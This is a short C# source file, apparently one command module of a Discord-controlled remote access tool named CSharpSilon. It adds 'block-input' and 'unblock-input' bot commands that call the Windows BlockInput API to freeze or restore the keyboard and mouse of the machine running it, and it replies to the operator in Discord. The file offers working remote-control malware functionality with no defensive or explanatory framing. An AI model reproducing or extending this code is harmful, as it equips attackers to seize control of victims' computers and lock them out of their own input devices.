using System.Runtime.InteropServices;
using Discord.Commands;
using Discord.WebSocket;
using System.Threading.Tasks;

namespace CSharpSilon.cmds
{
    public class Input : ModuleBase<SocketCommandContext>
    {
        private static bool inputBlocked = false;
        
        [DllImport("user32.dll")]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool BlockInput([MarshalAs(UnmanagedType.Bool)] bool fBlockIt);
        
        [Command("block-input")]
        public async Task BlockInput()
        {
            if (!inputBlocked)
            {
                BlockInput(true);
                inputBlocked = true;
                await ReplyAsync("Input Blocked.");
            }
            else
            {
                await ReplyAsync("Input Already Blocked");
            }
            
        }

        [Command("unblock-input")]
        public async Task UnblockInput()
        {
            if (inputBlocked)
            {
                BlockInput(false);
                inputBlocked = false;
                await ReplyAsync("Input Unblocked.");
            }
            else
            {
                await ReplyAsync("Input Not Blocked");
            }
        }
    }
}